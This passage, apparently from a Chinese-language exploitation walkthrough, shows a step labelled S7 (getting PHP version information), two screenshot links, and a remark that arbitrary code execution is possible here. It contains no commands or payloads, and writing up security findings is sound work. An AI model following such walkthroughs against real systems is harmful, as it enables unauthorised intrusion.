![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwqWibu5u9qCIZ4js5fOPvZQEIHFPhicelWooyFZokFFkv9VSIAnzoZHIg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**S7：获取php版本信息，**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwEmhZM5yPPO5BZAsjSYCrMFFq0r6f8h5w8uMzCp424bTXvkU4BkQicXA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里也可以直接进行任意代码执行！！！